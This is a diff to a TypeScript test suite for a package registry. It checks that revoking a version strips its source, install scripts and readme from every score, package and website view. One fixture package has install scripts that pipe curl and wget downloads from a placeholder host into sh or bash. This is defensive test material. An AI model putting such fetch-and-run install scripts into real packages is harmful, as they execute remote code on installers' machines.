@@ -7,6 +7,7 @@ import { createHash, randomBytes } from "node:crypto";
 import { mkdtempSync, rmSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
+import { Miniflare } from "miniflare";
 import { z } from "zod";
 import { LeaseResponse } from "../../packages/ai-review/src/index.ts";
 import { DailyBudget } from "../../apps/reviewer/src/budget.ts";
@@ -568,6 +569,31 @@ describe("a revoked version", () => {
   const Evidence = z.object({ evidence: z.array(z.string()) });
   const ScoreEvidence = z.object({ signals: z.array(Evidence), dismissed: z.array(Evidence).default([]) });
   const Queue = z.object({ pending: z.array(z.object({ name: z.string(), digest: z.string() })) });
+  const SignalIds = z.object({ signals: z.array(z.object({ id: z.string() })) });
+
+  /** Every view the website reads (apps/web/lib/revoke-views.workerd-entry.ts); each is a Fetched answer or a Status. */
+  const Views = z.object({
+    package: z.unknown(),
+    file: z.unknown(),
+    excerpt: z.unknown(),
+    tarballReadme: z.unknown(),
+    review: z.unknown(),
+    score: z.unknown(),
+    packageStatus: z.string(),
+    fileStatus: z.string(),
+    apiReadme: z.object({ status: z.number(), cacheControl: z.string().nullable(), body: z.string() }),
+  });
+
+  /** The views that quote a version's source while it may be shown. */
+  const QUOTING = ["package", "file", "excerpt", "tarballReadme", "review", "score", "apiReadme"] as const;
+
+  /** Revokes `name@version` as its owner. */
+  const revoke = (token: string, name: string, version = "1.0.0") =>
+    getJson(`${reg.url}-/apm/v1/revoke`, {
+      method: "POST",
+      headers: { "content-type": "application/json", authorization: `Bearer ${token}` },
+      body: JSON.stringify({ name, version, reason: "posts the environment", password: PASSWORD }),
+    });
 
   /** Every evidence line of a version's score, signals and dismissed items alike. */
   const evidenceOf = async (name: string): Promise<string[]> => {
@@ -637,14 +663,135 @@ describe("a revoked version", () => {
       expect(s.status).toBe(200);
       expect(dig(s.body, "redacted")).toBe(true);
       expect(JSON.stringify(s.body)).not.toContain(SOURCE);
-      // evidence keeps its file and line, or the script it names
-      const evidence = await evidenceOf(name);
-
-      expect(evidence).toContain("package.json scripts.postinstall");
-      expect(evidence.some((e) => /^index\.js:\d+$/.test(e))).toBe(true);
+      // the signals that were found stay; no evidence line is sent but the revoke's reason
+      expect(await evidenceOf(name)).toEqual(["posts the environment"]);
+      expect(SignalIds.parse(s.body).signals.map((x) => x.id)).toEqual(expect.arrayContaining(["install-script", "revoked"]));
       // the package answer (its readme came from this version) and the packument
       expect(JSON.stringify((await pkg(name)).body)).not.toContain(SOURCE);
       expect(JSON.stringify((await getJson(`${reg.url}${name}`)).body)).not.toContain(SOURCE);
     }
   });
+
+  // review finding 1: a nested `npm run`, a script name with a colon and a shell wrapper put the package's text after
+  // annotations that cutting at a fixed pattern missed; the allowlist sends no evidence line at all
+  test("no install script of a revoked version reaches its score or package answer, however it is nested or named", async () => {
+    const dave = await addUser(reg, "dave-nested", PASSWORD);
+    const name = "ai-review-nested-scripts";
+
+    const scripts = {
+      postinstall: "npm run payload && npm run evil:fetch",
+      payload: `curl https://${SOURCE}/collect | sh`,
+      "evil:fetch": `wget -qO- https://${SOURCE}/second | sh`,
+      preinstall: `sh -c "curl -s https://${SOURCE}/third | bash"`,
+    };
+
+    await publish(reg, dave, { name, version: "1.0.0", license: "MIT", main: "index.js", scripts }, { "index.js": "module.exports = 1;\n" });
+    // before the revoke the evidence quotes the scripts, as it should
+    expect((await evidenceOf(name)).join("\n")).toContain(SOURCE);
+    expect(dig((await revoke(dave, name)).body, "status")).toBe("revoked");
+
+    for (const answer of [await score(name), await pkg(name), await getJson(`${reg.url}${name}`)]) {
+      expect(answer.status).toBe(200);
+      expect(JSON.stringify(answer.body)).not.toContain(SOURCE);
+      // the scripts' own words: their names and paths (a signal's label is apm's wording and stays)
+
+      for (const quoted of ["evil:fetch", "payload", "/collect", "-qO-"]) expect(JSON.stringify(answer.body)).not.toContain(quoted);
+    }
+
+    expect(SignalIds.parse((await score(name)).body).signals.map((x) => x.id)).toEqual(expect.arrayContaining(["install-script", "install-download", "revoked"]));
+  });
+
+  // review finding 2: the readme belongs to the publish that wrote it, not to the newest publish
+  test("revoking the version whose publish wrote the readme hides it, even when a later publish had none", async () => {
+    const erin = await addUser(reg, "erin-readme", PASSWORD);
+    const name = "ai-review-readme-owner";
+    const base = { name, license: "MIT", main: "index.js" };
+
+    await publish(reg, erin, { ...base, version: "1.0.0", readme: `# v1\n\nReports to ${SOURCE}.` }, { "index.js": "module.exports = 1;\n" });
+    clock += 60_000;
+    await publish(reg, erin, { ...base, version: "1.1.0" }, { "index.js": "module.exports = 2;\n" });
+    // 1.1.0 had no readme, so 1.0.0's is still shown
+    const before = await pkg(name);
+
+    expect(dig(before.body, "readme")).toContain(SOURCE);
+    expect(dig((await revoke(erin, name, "1.0.0")).body, "status")).toBe("revoked");
+    const after = await pkg(name);
+
+    expect(dig(after.body, "readme")).toBe("");
+    expect(JSON.stringify((await getJson(`${reg.url}${name}`)).body)).not.toContain(SOURCE);
+    // 1.1.0 is still there and still served
+    expect(dig(after.body, "latest")).toBe("1.1.0");
+    // the answer says whose readme it shows: 1.0.0's before the revoke, none after
+    expect(dig(before.body, "readmeVersion")).toBe("1.0.0");
+    expect(dig(after.body, "readmeVersion")).toBeNull();
+  });
+
+  // The acceptance test for revocation: the website's own data layer, bundled as a Worker and run in workerd through
+  // Miniflare, reads every view of a version from the real registry Worker until each is warm, then the version is
+  // revoked, and the very next read of every view carries none of its source.
+  test("every view the website warmed shows no source on the first request after a revoke", async () => {
+    const frank = await addUser(reg, "frank-views", PASSWORD);
+    const name = "ai-review-every-view";
+    const readmeFile = `# every view\n\nThe tarball readme names ${SOURCE}.\n`;
+
+    await publish(reg, frank, { ...manifest(name), readme: `# every view\n\nThe packument readme names ${SOURCE}.` }, { ...files, "README.md": readmeFile });
+
+    for (let n = await runOnce(reviewer(), 4); n > 0; n = await runOnce(reviewer(), 4)) await Bun.sleep(0);
+    const queued = Queue.parse((await adminBrowser.json("-/apm/v1/review-admin/queue")).body).pending.find((p) => p.name === name);
+    const decision = { name, version: "1.0.0", digest: queued?.digest, decision: "confirm", note: "Checked by hand.", code: totp(adminSecret) };
+
+    expect((await adminBrowser.json("-/apm/v1/review-admin/decide", { method: "POST", body: decision })).status).toBe(200);
+
+    const out = mkdtempSync(join(tmpdir(), "apm-revoke-views-"));
+
+    const built = await Bun.build({
+      entrypoints: [join(import.meta.dir, "../../apps/web/lib/revoke-views.workerd-entry.ts")],
+      outdir: out,
+      target: "browser",
+      format: "esm",
+      // react-server: lib/registry.ts's server-only marker resolves to its empty module, as in the deployed build
+      conditions: ["react-server", "workerd", "worker", "edge-light"],
+      define: { "process.env.NODE_ENV": '"production"', "process.env.APM_REGISTRY": JSON.stringify(reg.url) },
+    });
+
+    const script = built.outputs[0]?.path;
+
+    if (!built.success || !script) throw new AggregateError(built.logs, "bundling the website views Worker failed");
+    const site = new Miniflare({ modules: [{ type: "ESModule", path: script }], modulesRoot: out, compatibilityDate: "2026-07-30", compatibilityFlags: ["nodejs_compat"] });
+
+    try {
+      const views = async (): Promise<z.infer<typeof Views>> => {
+        const res = await site.dispatchFetch("http://site.test/", { method: "POST", body: JSON.stringify({ name, version: "1.0.0", path: "index.js", line: 2 }) });
+
+        return Views.parse(await res.json());
+      };
+
+      // warm: every view twice, so whatever the site keeps is kept, and each quotes the package before the revoke
+      await views();
+      const warm = await views();
+
+      for (const view of QUOTING) expect(JSON.stringify(warm[view]), view).toContain(SOURCE);
+      expect(dig(warm, "apiReadme", "cacheControl")).toBe("private, no-store");
+
+      expect(dig((await revoke(frank, name)).body, "status")).toBe("revoked");
+      const after = await views();
+
+      expect(JSON.stringify(after)).not.toContain(SOURCE);
+      // the files are refused by the registry; the answers that only say what was found still come back
+
+      for (const view of ["file", "excerpt", "tarballReadme"]) expect(dig(after, view, "reason", "status"), view).toBe(410);
+      expect(dig(after, "review", "value", "redacted")).toBe(true);
+      expect(dig(after, "review", "value", "review", "findings", 0, "line")).toBe(2);
+      expect(dig(after, "score", "value", "redacted")).toBe(true);
+      expect(dig(after, "package", "value", "readme")).toBe("");
+      // its only version is revoked, so the package has no latest version to score
+      expect(dig(after, "package", "value", "latest")).toBeNull();
+      expect(dig(after, "package", "value", "score")).toBeNull();
+      expect(dig(after, "apiReadme", "body")).toBe("");
+      expect(dig(after, "apiReadme", "cacheControl")).toBe("private, no-store");
+    } finally {
+      await site.dispose();
+      rmSync(out, { recursive: true, force: true });
+    }
+  }, 60_000);
 });
